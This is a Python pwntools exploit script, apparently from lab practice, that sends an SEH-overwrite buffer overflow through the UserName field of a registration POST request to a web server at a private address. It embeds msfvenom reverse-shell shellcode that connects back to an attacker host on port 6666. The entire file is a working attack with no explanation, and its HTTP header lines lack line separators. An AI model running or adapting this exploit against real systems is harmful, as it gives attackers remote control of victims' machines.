from pwn import *

s = remote('192.168.8.111',80)

badchars = b'\x00\x25\x2b'
chars = bytes([i for i in range(0x100)])
chars = chars.translate(None,badchars)

# msfvenom -p windows/shell_reverse_tcp -b '\x00\x25\x2b' exitfunc=thread -f python LHOST=192.168.8.102 LPORT=6666
shellcode = b''
shellcode += b"\xdb\xc5\xd9\x74\x24\xf4\xba\x1c\x61\x66\x9e\x58\x31"
shellcode += b"\xc9\xb1\x52\x31\x50\x17\x83\xe8\xfc\x03\x4c\x72\x84"
shellcode += b"\x6b\x90\x9c\xca\x94\x68\x5d\xab\x1d\x8d\x6c\xeb\x7a"
shellcode += b"\xc6\xdf\xdb\x09\x8a\xd3\x90\x5c\x3e\x67\xd4\x48\x31"
shellcode += b"\xc0\x53\xaf\x7c\xd1\xc8\x93\x1f\x51\x13\xc0\xff\x68"
shellcode += b"\xdc\x15\xfe\xad\x01\xd7\x52\x65\x4d\x4a\x42\x02\x1b"
shellcode += b"\x57\xe9\x58\x8d\xdf\x0e\x28\xac\xce\x81\x22\xf7\xd0"
shellcode += b"\x20\xe6\x83\x58\x3a\xeb\xae\x13\xb1\xdf\x45\xa2\x13"
shellcode += b"\x2e\xa5\x09\x5a\x9e\x54\x53\x9b\x19\x87\x26\xd5\x59"
shellcode += b"\x3a\x31\x22\x23\xe0\xb4\xb0\x83\x63\x6e\x1c\x35\xa7"
shellcode += b"\xe9\xd7\x39\x0c\x7d\xbf\x5d\x93\x52\xb4\x5a\x18\x55"
shellcode += b"\x1a\xeb\x5a\x72\xbe\xb7\x39\x1b\xe7\x1d\xef\x24\xf7"
shellcode += b"\xfd\x50\x81\x7c\x13\x84\xb8\xdf\x7c\x69\xf1\xdf\x7c"
shellcode += b"\xe5\x82\xac\x4e\xaa\x38\x3a\xe3\x23\xe7\xbd\x04\x1e"
shellcode += b"\x5f\x51\xfb\xa1\xa0\x78\x38\xf5\xf0\x12\xe9\x76\x9b"
shellcode += b"\xe2\x16\xa3\x0c\xb2\xb8\x1c\xed\x62\x79\xcd\x85\x68"
shellcode += b"\x76\x32\xb5\x93\x5c\x5b\x5c\x6e\x37\xa4\x09\x78\xa1"
shellcode += b"\x4c\x48\x78\x37\x87\xc5\x9e\x2d\x87\x83\x09\xda\x3e"
shellcode += b"\x8e\xc1\x7b\xbe\x04\xac\xbc\x34\xab\x51\x72\xbd\xc6"
shellcode += b"\x41\xe3\x4d\x9d\x3b\xa2\x52\x0b\x53\x28\xc0\xd0\xa3"
shellcode += b"\x27\xf9\x4e\xf4\x60\xcf\x86\x90\x9c\x76\x31\x86\x5c"
shellcode += b"\xee\x7a\x02\xbb\xd3\x85\x8b\x4e\x6f\xa2\x9b\x96\x70"
shellcode += b"\xee\xcf\x46\x27\xb8\xb9\x20\x91\x0a\x13\xfb\x4e\xc5"
shellcode += b"\xf3\x7a\xbd\xd6\x85\x82\xe8\xa0\x69\x32\x45\xf5\x96"
shellcode += b"\xfb\x01\xf1\xef\xe1\xb1\xfe\x3a\xa2\xd2\x1c\xee\xdf"
shellcode += b"\x7a\xb9\x7b\x62\xe7\x3a\x56\xa1\x1e\xb9\x52\x5a\xe5"
shellcode += b"\xa1\x17\x5f\xa1\x65\xc4\x2d\xba\x03\xea\x82\xbb\x01"

buf = b''
buf += b'a'*216
# nSEH
buf += b'\xeb\x06\x90\x90'
# SEH
buf += p32(0x100190f7)
buf += shellcode
buf += b'A' * (725-len(buf))

req = b'POST /registresult.htm HTTP/1.1\r\n\r\n'
req += b'Host: 192.168.1.11'
req += b'User-Agent: Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0'
req += b'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
req += b'Accept-Language: en-US,en;q=0.5'
req += b'Accept-Encoding: gzip, deflate'
req += b'Referer: http://192.168.1.11/register.ghp'
req += b'Connection: close'
req += b'Content-Type: application/x-www-form-urlencoded'
req += b'UserName=' + buf + b'&Password=test&Password1=test&Sex=1&Email=x@&Icon=x.gif&Resume=xxxx&cw=1&RoomID=4&RepUserName=admin&submit1=Register'

s.send(req)
